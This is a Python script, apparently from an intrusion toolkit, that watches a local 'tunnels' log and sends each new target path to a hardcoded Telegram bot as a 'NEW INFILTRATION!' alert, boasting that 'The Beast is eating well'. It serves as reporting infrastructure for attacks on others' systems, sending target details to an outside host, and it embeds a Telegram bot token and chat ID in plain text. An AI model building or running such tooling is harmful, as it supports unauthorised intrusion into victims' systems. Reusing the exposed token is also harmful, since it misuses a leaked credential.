import time, os, httpx, asyncio

TOKEN = "8290479304:AAEa6o56IPfTNb8KJqSfiFXWLVjfU4DjxS0"
CHAT_ID = "7228901951"
LOG_FILE = "/data/data/com.termux/files/home/Titan-Lab/Data_Vault/codehub_tunnels.log"

async def send_alert(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    async with httpx.AsyncClient() as client:
        try: await client.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"})
        except: pass

async def watch_logs():
    print("🛡️ Auditor Active: Watching Data_Vault for new tunnels...")
    # إنشاء الملف لو مش موجود عشان ميديناش Error
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f: f.write("")

    last_size = os.path.getsize(LOG_FILE)
    while True:
        try:
            current_size = os.path.getsize(LOG_FILE)
            if current_size > last_size:
                with open(LOG_FILE, "r") as f:
                    f.seek(last_size)
                    new_lines = f.readlines()
                    for line in new_lines:
                        if "|" in line:
                            path = line.split("|")[1].strip()
                            msg = f"<b>🔥 [CodeHub] NEW INFILTRATION!</b>\n\n🎯 <b>Target:</b> <code>{path}</code>\n\n🚀 <i>The Beast is eating well...</i>"
                            await send_alert(msg)
                            print(f"✅ Alert sent for: {path}")
                last_size = current_size
        except: pass
        await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(watch_logs())
